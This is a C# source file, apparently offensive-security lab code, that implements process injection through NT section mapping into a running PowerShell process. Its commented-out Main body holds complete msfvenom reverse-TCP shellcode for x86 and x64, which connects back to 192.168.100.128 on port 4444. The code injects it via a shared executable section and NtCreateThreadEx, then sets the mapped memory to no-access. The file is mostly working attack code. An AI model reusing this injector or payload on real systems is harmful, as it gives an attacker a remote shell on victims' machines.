﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace LowLevelWinApiModifyPermsSection
{
    class Program
    {
        // https://www.pinvoke.net/default.aspx/kernel32/MapViewOfFile.html?diff=y
        private static readonly uint SECTION_MAP_READ = 0x0004;
        private static readonly uint SECTION_MAP_WRITE = 0x0002;
        private static readonly uint SECTION_MAP_EXECUTE = 0x0008;
        // https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        private static readonly uint SEC_COMMIT = 0x8000000;
        private static readonly uint PAGE_READWRITE = 0x04;
        private static readonly uint PAGE_READEXECUTE = 0x20;
        private static readonly uint PAGE_NOACCESS = 0x01;
        private static readonly uint MEM_RELEASE = 0x00008000;
        private static readonly uint MEM_DECOMMIT = 0x00004000;
        private static readonly uint DELETE = 0x00010000;


        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint OldAccessProtection);


        static void Main(string[] args)
        {
            //#region Shellcode
            //byte[] buf;
            //IntPtr hremoteProcess = default;

            //Process[] targetProcess = Process.GetProcessesByName("powershell");

            //if (targetProcess.Length == 0)
            //{
            //    Console.ForegroundColor = ConsoleColor.Red;
            //    Console.WriteLine("Target process, prowershell, not found!");

            //    Console.WriteLine("Start powershell and try again");
            //    Console.ForegroundColor = ConsoleColor.White;

            //    return;
            //}


            //bool processArch = false;



            ////Open remote process
            //hremoteProcess = OpenProcess(0x001F0FFF, false, targetProcess[0].Id);
            //IsWow64Process(hremoteProcess, out processArch);

            //// Local process handle
            //IntPtr hlocalProcess = Process.GetCurrentProcess().Handle;

            ////// x86 Payload: msfvenom -p windows/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            ////byte[] bufx86 = new byte[< LENGTH >] { < SHELLCODE_86 > };

            ////// x64 Payload: msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            ////byte[] bufx64 = new byte[< LENGTH >] { SHELLCODE_64 > };

            //byte[] bufx86 = new byte[324] {0xfc,0xe8,0x82,0x00,0x00,0x00,
            //    0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,
            //    0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
            //    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
            //    0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,
            //    0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,
            //    0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,
            //    0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
            //    0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,
            //    0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,
            //    0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,
            //    0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,
            //    0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
            //    0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,
            //    0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,
            //    0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,
            //    0x97,0x6a,0x05,0x68,0xc0,0xa8,0x64,0x80,0x68,0x02,0x00,0x11,
            //    0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,
            //    0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,
            //    0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x00,0x89,
            //    0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,
            //    0x66,0xc7,0x44,0x24,0x3c,0x01,0x01,0x8d,0x44,0x24,0x10,0xc6,
            //    0x00,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,
            //    0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,
            //    0x56,0x46,0xff,0x30,0x68,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,
            //    0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,
            //    0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            //    0x6f,0x6a,0x00,0x53,0xff,0xd5};

            //// x64 Payload: msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            //// byte[] bufx64 = new byte[< BYTES >] { < SHELLCODE_X64 > };


            //byte[] bufx64 = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            //    0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            //    0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            //    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            //    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            //    0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            //    0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            //    0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            //    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            //    0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            //    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            //    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            //    0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            //    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            //    0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            //    0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            //    0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            //    0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
            //    0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
            //    0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,
            //    0xc0,0xa8,0x64,0x80,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
            //    0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
            //    0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
            //    0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
            //    0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
            //    0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,
            //    0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,
            //    0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
            //    0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,
            //    0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,
            //    0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,
            //    0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,
            //    0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
            //    0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,
            //    0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
            //    0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
            //    0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
            //    0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
            //    0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};

            //if (processArch == true)
            //{
            //    //Injected process is x86
            //    buf = bufx86;
            //    Console.WriteLine("Shellcode injected to x86 process.");
            //}
            //else
            //{
            //    //Injected process is x64
            //    buf = bufx64;
            //    Console.WriteLine("Shellcode injected to x64 process.");

            //}

            //int len = buf.Length;
            //uint bufferLength = (uint)len;

            //// Create a new section.
            //IntPtr sectionHandler = new IntPtr();
            //long createSection = (int)NtCreateSection(ref sectionHandler, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref bufferLength, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            //Console.WriteLine("[+] New section was created.");
            //Console.WriteLine("1st breakpoint. Press Enter to continue ...");
            //Console.ReadLine();

            //// Map the new section for the LOCAL process.
            //IntPtr localBaseAddress = new IntPtr();
            //int sizeLocal = 4096;
            //ulong offsetSectionLocal = new ulong();


            //long mapSectionLocal = NtMapViewOfSection(sectionHandler, hlocalProcess, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, PAGE_READWRITE);

            //// Convert Demical to Hex
            //var localBaseAddrString = string.Format("{0:X}", localBaseAddress); //Pointer -> String (DEC) format.
            //UInt64 localBaseAddrInt = UInt64.Parse(localBaseAddrString, System.Globalization.NumberStyles.HexNumber); //String -> Integer
            //string localBaseAddHex = localBaseAddrInt.ToString("x"); //Integer -> Hex

            //Console.WriteLine("[+] New section mapped for the LOCAL process!");
            //Console.WriteLine("Local ProcessID: " + Process.GetCurrentProcess().Id);
            //Console.WriteLine("Local Process BaseAddress: 0x" + localBaseAddHex);
            //Console.WriteLine("View size: " + sizeLocal);
            //Console.WriteLine("Offset: " + offsetSectionLocal);
            //Console.WriteLine("2nd breakpoint. Press Enter to continue ...");
            //Console.ReadLine();

            //// Map the new section for the REMOTE process.
            //IntPtr remoteBaseAddress = new IntPtr();
            //int sizeRemote = 4096;
            //ulong offsetSectionRemote = new ulong();
            //long mapSectionRemote = NtMapViewOfSection(sectionHandler, hremoteProcess, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, PAGE_READEXECUTE);

            //// Convert Demical to Hex
            //var remoteBaseAddrString = string.Format("{0:X}", remoteBaseAddress); //Pointer -> String (DEC) format.
            //UInt64 remoteBaseAddrInt = UInt64.Parse(remoteBaseAddrString, System.Globalization.NumberStyles.HexNumber); //String -> Integer
            //string remoteBaseAddHex = remoteBaseAddrInt.ToString("x"); //Integer -> Hex

            //Console.WriteLine("[+] New section mapped for the REMOTE process!");
            //Console.WriteLine("Remote ProcessID: " + targetProcess[0].Id);
            //Console.WriteLine("Remote Process BaseAddress: 0x" + remoteBaseAddHex);
            //Console.WriteLine("View size: " + sizeRemote);
            //Console.WriteLine("Offset: " + offsetSectionRemote);
            //Console.WriteLine("3rd breakpoint. Press Enter to continue ...");
            //Console.ReadLine();

            //Marshal.Copy(buf, 0, localBaseAddress, buf.Length);
            //Console.WriteLine("[+] Shellcode copied to local process: 0x" + localBaseAddHex);
            //Console.WriteLine("[+] Mapped to remote process address: 0x" + remoteBaseAddHex);
            //Console.WriteLine("4th breakpoint. Press Enter to continue ...");
            //Console.ReadLine();


            //unsafe
            //{
            //    fixed (byte* p = &buf[0])
            //    {
            //        byte* p2 = p;
            //        // https://stackoverflow.com/questions/2057469/how-can-i-display-a-pointer-address-in-c
            //        //string bufAddress = string.Format("0x{0:X}", new IntPtr(p2));

            //        //Convert DEC->HEX
            //        var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
            //        UInt64 bufInt = UInt64.Parse(bufString, System.Globalization.NumberStyles.HexNumber); //String -> Integer
            //        string bufHex = bufInt.ToString("x"); //Integer -> Hex

            //        Console.WriteLine("[+] Payload Address on this executable: " + "0x" + bufHex);

            //    }
            //}


            ////Enumerate the threads of the remote process before creating a new one.
            //List<int> threadList = new List<int>();
            //ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess[0].Id).Threads;
            //foreach (ProcessThread thread in threadsBefore)
            //{
            //    threadList.Add(thread.Id);
            //}

            ////Create a remote thread and execute it.
            ////IntPtr hThread = CreateRemoteThread(hremoteProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);

            //IntPtr hRemoteThread;
            //uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, hremoteProcess, remoteBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);


            //if (hThread == 0x00)
            //{
            //    Console.WriteLine("[+] Injection Succeded!");
            //}
            //else
            //{
            //    Console.WriteLine("[-] Injection failed!");
            //}

            ////Enumerate threads from the given process.
            //ProcessThreadCollection threads = Process.GetProcessById(targetProcess[0].Id).Threads;
            //foreach (ProcessThread thread in threads)
            //{
            //    if (!threadList.Contains(thread.Id))
            //    {
            //        Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
            //        Console.WriteLine("\n");
            //    }

            //}

            //uint flOld = 0;
            //uint sectionSize = (uint)sizeLocal;
            //uint mapSectionModifyPerm = NtProtectVirtualMemory(hremoteProcess, ref remoteBaseAddress, ref sectionSize, PAGE_NOACCESS, ref flOld);

            //if (mapSectionModifyPerm == 0x00)
            //{
            //    Console.WriteLine("[+] Permissions of the section has been changed!");
            //    Console.ReadLine();
            //}
            //else
            //{
            //    Console.WriteLine("[-] Permissions of the section hasn't been changed!");
            //}


            //// Unmap the locally mapped section: 'NtUnMapViewOfSection'
            //uint unmapStatus = NtUnmapViewOfSection(hlocalProcess, localBaseAddress);
            //Console.WriteLine("[+] Local memory section unmapped!");

            //// Close the section
            //int SectionStatus = NtClose(sectionHandler);
            //Console.WriteLine("[+] Memory section closed!");

            //#endregion Shellcode
        }
    }
}
